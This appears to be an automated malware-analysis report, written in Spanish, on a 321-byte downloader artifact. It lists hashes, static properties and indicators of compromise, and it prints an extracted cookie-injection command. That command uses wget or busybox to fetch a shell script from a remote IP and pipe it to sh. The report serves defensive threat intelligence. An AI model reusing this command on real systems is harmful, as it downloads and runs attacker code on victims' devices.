# 🧬 Payload Analysis

`3fcd3e2e667e339ed82ddc770bcf7ad39e67572c12e4e96ed25c1b0847b2ad46`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 321 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:11.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `3fcd3e2e667e339ed82ddc770bcf7ad39e67572c12e4e96ed25c1b0847b2ad46`
- **MD5:** `8c9c9c82332179d80ce579912c4cbc83`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 321 B |
| Entropía | 5.16 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
setCookie=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s zyxsc;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s z
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 190.179.168.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | setCookie=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s zyxsc;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s z | strings |
| hash | 3fcd3e2e667e339ed82ddc770bcf7ad39e67572c12e4e96ed25c1b0847b2ad46 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
